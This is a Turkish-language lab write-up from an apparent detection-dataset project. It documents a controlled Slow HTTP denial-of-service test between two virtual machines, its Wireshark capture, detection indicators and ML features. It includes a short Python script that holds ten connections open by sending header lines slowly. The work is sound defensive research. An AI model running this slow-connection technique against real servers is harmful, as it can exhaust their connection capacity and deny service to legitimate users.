# Slow HTTP Attack

## 1. Genel Bakış

Slow HTTP Attack, HTTP protokolünün çalışma biçiminden yararlanan bir Denial-of-Service (DoS) saldırı türüdür. Saldırının temel amacı, web sunucusuna yapılan HTTP bağlantılarını uzun süre açık tutarak sunucunun bağlantı kaynaklarını tüketmektir.

HTTP Flood saldırısından farklı olarak Slow HTTP Attack'ta temel amaç çok yüksek sayıda HTTP request göndermek değildir. Bunun yerine HTTP request veya header bilgilerinin yavaş ve parçalı şekilde gönderilmesiyle bağlantıların uzun süre açık tutulması hedeflenir.

Bu çalışmada kontrollü bir Slow HTTP Attack laboratuvar ortamında gerçekleştirilmiş, trafik Wireshark ile yakalanmış ve PCAPNG formatında kaydedilmiştir.

Çalışmanın amacı CyberTrace projesi için Slow HTTP saldırı trafiğinden oluşan bir veri örneği oluşturmaktır.

---

## 2. Slow HTTP Attack Nasıl Çalışır?

Normal bir HTTP bağlantısında istemci request'i kısa sürede gönderir ve sunucu request'i tamamlayarak response üretir.

Basitleştirilmiş normal trafik:

```text
Client
  |
  | GET /
  v
Web Server
  |
  | HTTP Response
  v
Client
```

Slow HTTP Attack'ta ise saldırgan bağlantıyı açık tutarak HTTP verisini yavaş ve aralıklı şekilde göndermeye çalışır.

```text
Client
  |
  | GET / HTTP/1.1
  |------------------>
  |
  |     bekle
  |
  | X-Test: slow-data
  |------------------>
  |
  |     bekle
  |
  | X-Test: slow-data
  |------------------>
  |
  |     bekle
  |
  | ...
  v
Web Server
```

Bu davranış nedeniyle sunucu ilgili bağlantıları belirli bir süre boyunca açık tutabilir.

---

## 3. HTTP Flood ile Farkı

Slow HTTP Attack ile HTTP Flood arasındaki temel fark saldırı yöntemidir.

### HTTP Flood

HTTP Flood saldırısında kısa süre içerisinde çok sayıda HTTP request gönderilir.

```text
GET
GET
GET
GET
GET
GET
GET
GET
```

Amaç yüksek request rate oluşturmaktır.

### Slow HTTP Attack

Slow HTTP Attack'ta ise daha az sayıda bağlantı kullanılarak bağlantıların uzun süre açık tutulması hedeflenir.

```text
Connection
──────────────────────────────
       ↓       ↓       ↓
      data    data    data
```

Bu nedenle tespit sırasında yalnızca request sayısına bakmak yeterli değildir. Connection duration, inter-arrival time ve TCP bağlantılarının davranışı da değerlendirilmelidir.

---

## 4. Laboratuvar Ortamı

| Bileşen           | Bilgi                |
| ----------------- | -------------------- |
| Saldırgan         | Windows Host         |
| Saldırgan IP      | `192.168.56.1`       |
| Hedef             | Kali Linux           |
| Hedef IP          | `192.168.56.101`     |
| Hedef Port        | `8000`               |
| Protokol          | HTTP / TCP           |
| Web Server        | Python HTTP Server   |
| Ağ                | VirtualBox Host-Only |
| Capture Interface | `eth1`               |
| Trafik Analizi    | Wireshark            |
| Kayıt Formatı     | PCAPNG               |

---

## 5. HTTP Server'ın Oluşturulması

Kali Linux üzerinde Slow HTTP trafiğini yakalayabilmek için Python'ın yerleşik HTTP server modülü kullanılmıştır.

Çalışma klasörü oluşturulmuştur:

```bash
cd ~/Desktop
mkdir -p slow-http-lab
cd slow-http-lab
```

Test amacıyla basit bir HTML dosyası oluşturulmuştur:

```bash
echo "<html><body><h1>CyberTrace Slow HTTP Lab</h1></body></html>" > index.html
```

HTTP server aşağıdaki komutla başlatılmıştır:

```bash
python3 -m http.server 8000 --bind 192.168.56.101
```

Server:

```text
192.168.56.101:8000
```

adresinde çalıştırılmıştır.

---

## 6. Bağlantı Testi

Saldırı gerçekleştirilmeden önce HTTP servisinin erişilebilir olduğu kontrol edilmiştir.

Windows PowerShell:

```powershell
Test-NetConnection 192.168.56.101 -Port 8000
```

Port bağlantısının başarılı olması durumunda:

```text
TcpTestSucceeded : True
```

sonucu alınmıştır.

Normal HTTP bağlantısının çalıştığını doğrulamak için:

```powershell
curl.exe http://192.168.56.101:8000/
```

komutu kullanılmıştır.

---

## 7. Wireshark ile Trafik Yakalama

Slow HTTP trafiğini yakalamak için Kali Linux üzerinde Wireshark kullanılmıştır.

Capture işlemi:

```text
Interface: eth1
IP: 192.168.56.101
```

üzerinden gerçekleştirilmiştir.

Capture sırasında herhangi bir capture filter kullanılmamıştır.

Böylece saldırı trafiğinin ham paketleri PCAPNG dosyasına kaydedilmiştir.

Trafiği analiz etmek için capture sonrasında aşağıdaki display filter kullanılmıştır:

```text
tcp.port == 8000
```

Saldırgan ile hedef arasındaki trafik için:

```text
ip.src == 192.168.56.1 && ip.dst == 192.168.56.101 && tcp.port == 8000
```

filtresi kullanılmıştır.

---

## 8. Slow HTTP Test Scripti

Kontrollü saldırı simülasyonu Windows sistemi üzerinden Python kullanılarak gerçekleştirilmiştir.

Script:

```python
import socket
import time

TARGET = "192.168.56.101"
PORT = 8000

connections = []

for i in range(10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET, PORT))

        s.sendall(
            b"GET / HTTP/1.1\r\n"
            b"Host: 192.168.56.101\r\n"
        )

        connections.append(s)

        print(f"[+] Connection {i+1} opened")

    except Exception as e:
        print(f"[-] Connection {i+1} failed: {e}")

print("[*] Connections are being kept open.")

for i in range(20):
    for s in connections:
        try:
            s.sendall(b"X-Test: slow-data\r\n")
        except:
            pass

    print(f"[*] Slow data sent - {i+1}/20")
    time.sleep(3)

for s in connections:
    try:
        s.sendall(b"\r\n")
        s.close()
    except:
        pass

print("[+] Test completed.")
```

Script Windows üzerinde aşağıdaki komutla çalıştırılmıştır:

```powershell
python .\slow_http_test.py
```

---

## 9. Saldırı Mekanizması

Test scripti toplam 10 TCP bağlantısı oluşturmuştur.

Her bağlantı üzerinde HTTP request başlangıcı gönderilmiş ve bağlantılar hemen kapatılmamıştır.

Ardından belirli aralıklarla:

```text
X-Test: slow-data
```

verisi gönderilmiştir.

Bu veri yaklaşık 3 saniyelik aralıklarla gönderilerek bağlantıların belirli bir süre açık tutulması sağlanmıştır.

Genel trafik modeli:

```text
Windows
192.168.56.1
      |
      +---- TCP Connection 1 ----+
      +---- TCP Connection 2 ----+
      +---- TCP Connection 3 ----+
      +---- TCP Connection ... --+
      +---- TCP Connection 10 ---+
                                  |
                                  v
                        Kali HTTP Server
                        192.168.56.101:8000
```

Bu yapı HTTP Flood'daki yüksek request rate davranışından farklıdır.

---

## 10. Wireshark'ta Gözlemlenen Paket

Capture sırasında aşağıdaki tipte TCP paketleri gözlemlenmiştir:

```text
192.168.56.1 → 192.168.56.101
6410 → 8000
PSH, ACK
Len=38
```

Bu paket, Windows sisteminin Kali üzerindeki HTTP server'a TCP üzerinden uygulama verisi gönderdiğini göstermektedir.

`PSH, ACK` bayrakları TCP bağlantısı üzerinden uygulama verisinin iletildiğini göstermektedir.

Wireshark tarafından bazı TCP segmentlerinin daha büyük bir TCP PDU'nun parçası olduğu da belirtilmiştir:

```text
TCP PDU reassembled
```

Bu durum TCP seviyesindeki parçalı verinin Wireshark tarafından yeniden birleştirildiğini göstermektedir.

---

## 11. TCP Stream Analizi

Slow HTTP trafiğini daha ayrıntılı incelemek için ilgili TCP paketlerinden:

```text
Right Click
→ Follow
→ TCP Stream
```

seçeneği kullanılmıştır.

TCP Stream içerisinde HTTP request başlangıcı ve yavaş gönderilen veri parçaları incelenmiştir.

Örneğin:

```text
GET / HTTP/1.1
Host: 192.168.56.101
X-Test: slow-data
X-Test: slow-data
X-Test: slow-data
```

şeklindeki veriler gözlemlenebilir.

Bu yapı HTTP request verisinin tek seferde tamamlanması yerine bağlantının açık tutulduğu kontrollü test davranışını göstermektedir.

---

## 12. Önemli Wireshark Filtreleri

### HTTP server trafiği

```text
tcp.port == 8000
```

### Windows → Kali

```text
ip.src == 192.168.56.1 && ip.dst == 192.168.56.101
```

### Windows → Kali HTTP trafiği

```text
ip.src == 192.168.56.1 &&
ip.dst == 192.168.56.101 &&
tcp.port == 8000
```

### TCP paketleri

```text
tcp
```

### Belirli TCP stream

Wireshark'ta ilgili paket üzerinden:

```text
Follow → TCP Stream
```

kullanılabilir.

---

## 13. Slow HTTP Attack Tespit Göstergeleri

Slow HTTP Attack'ın tespitinde aşağıdaki davranışlar incelenebilir:

* Uzun süre açık kalan TCP bağlantıları
* Düşük veri gönderim hızı
* HTTP verisinin küçük parçalar halinde gönderilmesi
* Paketler arasındaki zaman aralıklarının yüksek olması
* Aynı kaynak IP'den birden fazla uzun süreli bağlantı
* Uzun connection duration
* Düşük request rate
* Normal HTTP trafiğine göre anormal inter-arrival time

Bu özellikler HTTP Flood tespitinde kullanılan yüksek request rate yaklaşımından farklıdır.

---

## 14. CyberTrace İçin Önemli Feature'lar

Slow HTTP Attack'ın makine öğrenmesi tabanlı tespitinde aşağıdaki özellikler kullanılabilir:

| Feature                 | Açıklama                            |
| ----------------------- | ----------------------------------- |
| Source IP               | Kaynak sistem                       |
| Destination IP          | Hedef sistem                        |
| Destination Port        | Hedef port                          |
| Protocol                | TCP / HTTP                          |
| Connection Count        | Bağlantı sayısı                     |
| Flow Duration           | Akış süresi                         |
| Packet Count            | Paket sayısı                        |
| Byte Count              | Toplam byte                         |
| Average Packet Size     | Ortalama paket boyutu               |
| Inter-Arrival Time      | Paketler arasındaki süre            |
| TCP Connection Duration | TCP bağlantısının açık kalma süresi |
| Request Rate            | HTTP request hızı                   |
| Payload Rate            | Veri gönderim hızı                  |
| TCP Flags               | TCP bayrakları                      |

Özellikle:

```text
Flow Duration
Inter-Arrival Time
Connection Duration
Payload Rate
Request Rate
```

özellikleri Slow HTTP davranışının belirlenmesinde önemlidir.

---

## 15. Veri Seti Etiketi

CyberTrace veri setinde bu trafik aşağıdaki etiketle sınıflandırılabilir:

```text
Slow_HTTP_Attack
```

Örnek:

```text
Source IP: 192.168.56.1
Destination IP: 192.168.56.101
Destination Port: 8000
Protocol: HTTP
Label: Slow_HTTP_Attack
```

Bu etiket ilerleyen aşamada veri ön işleme ve makine öğrenmesi modelinin eğitilmesinde kullanılabilir.

---

## 16. PCAP Dosyası

Saldırı trafiği aşağıdaki dosyaya kaydedilmiştir:

```text
slow_http_attack.pcapng
```

Dosyanın bulunduğu klasör:

```text
~/Desktop/slow-http-lab/
```

Dosyanın kontrol edilmesi:

```bash
ls -lh ~/Desktop/slow-http-lab/slow_http_attack.pcapng
```

PCAP hakkında istatistik almak için:

```bash
capinfos ~/Desktop/slow-http-lab/slow_http_attack.pcapng
```

### PCAP İstatistikleri

> Gerçek `capinfos` çıktısı kullanılarak doldurulacaktır.

```text
File name:
File size:
First packet:
Last packet:
Capture duration:
Number of packets:
```

---

## 17. Ekran Görüntüleri

### 17.1 HTTP Server

Kali üzerinde Python HTTP server'ın çalıştığını gösteren ekran görüntüsü:

```text
[SCREENSHOT: Slow HTTP Lab Python HTTP Server]
```

### 17.2 Windows Script

Slow HTTP test scriptinin çalıştırıldığı PowerShell ekranı:

```text
[SCREENSHOT: Slow HTTP test script execution]
```

### 17.3 Slow HTTP Traffic

Wireshark üzerinde `tcp.port == 8000` filtresi kullanılarak görüntülenen trafik:

```text
[SCREENSHOT: Slow HTTP traffic in Wireshark]
```

### 17.4 TCP Stream

İlgili TCP bağlantısının Follow TCP Stream ekranı:

```text
[SCREENSHOT: Follow TCP Stream showing slow HTTP data]
```

### 17.5 Time Interval

Paketlerin aralıklı olarak gönderildiğini gösteren Wireshark ekranı:

```text
[SCREENSHOT: Slow packet transmission intervals]
```

### 17.6 PCAP Statistics

`capinfos` çıktısı:

```text
[SCREENSHOT: PCAP statistics]
```

---

## 18. HTTP Flood ve Slow HTTP Karşılaştırması

| Özellik            | HTTP Flood           | Slow HTTP Attack                   |
| ------------------ | -------------------- | ---------------------------------- |
| Ana amaç           | Yüksek request rate  | Bağlantıları uzun süre açık tutmak |
| Request sayısı     | Çok yüksek           | Daha düşük olabilir                |
| Veri gönderim hızı | Yüksek               | Düşük                              |
| Bağlantı süresi    | Genellikle daha kısa | Uzun                               |
| Temel gösterge     | Request Rate         | Connection Duration                |
| Paket aralığı      | Çok kısa             | Daha uzun                          |
| Uygulama katmanı   | HTTP                 | HTTP                               |
| TCP bağlantıları   | Çok sayıda olabilir  | Az sayıda uzun bağlantı olabilir   |

---

## 19. Laboratuvar Sonucu

Bu çalışmada kontrollü bir Slow HTTP Attack simülasyonu gerçekleştirilmiştir.

Windows sistemi üzerinden Kali Linux üzerinde çalışan Python HTTP server'a birden fazla TCP bağlantısı oluşturulmuş ve HTTP verileri belirli aralıklarla gönderilmiştir.

Wireshark analizi sırasında TCP bağlantıları, `PSH, ACK` paketleri ve uygulama verisinin TCP segmentleri içerisinde taşındığı gözlemlenmiştir. TCP Stream analizi kullanılarak bağlantı içerisindeki HTTP verileri incelenmiştir.

Çalışma sonucunda Slow HTTP Attack'ın HTTP Flood'dan temel olarak farklı olduğu görülmüştür. HTTP Flood yüksek sayıda request göndermeye odaklanırken Slow HTTP Attack daha düşük hızda veri göndererek bağlantıları uzun süre açık tutmaya odaklanmaktadır.

Oluşturulan PCAPNG dosyası CyberTrace saldırı veri setine dahil edilmek üzere saklanmıştır.

---

## 20. Klasör Yapısı

GitHub repository içerisinde saldırı aşağıdaki yapıda saklanacaktır:

```text
network-attacks/
└── slow-http-attack/
    ├── slow-http-attack.md
    ├── slow_http_attack.pcapng
    └── screenshots/
        ├── http-server.png
        ├── slow-http-script.png
        ├── slow-http-traffic.png
        ├── tcp-stream.png
        ├── packet-interval.png
        └── pcap-statistics.png
```

---

## 21. Sonraki Aşama

Planlanan saldırı listesine göre Slow HTTP Attack çalışmasından sonra:

```text
12. SSH Brute Force
```

çalışmasına geçilecektir.

SSH Brute Force çalışmasında kontrollü labor
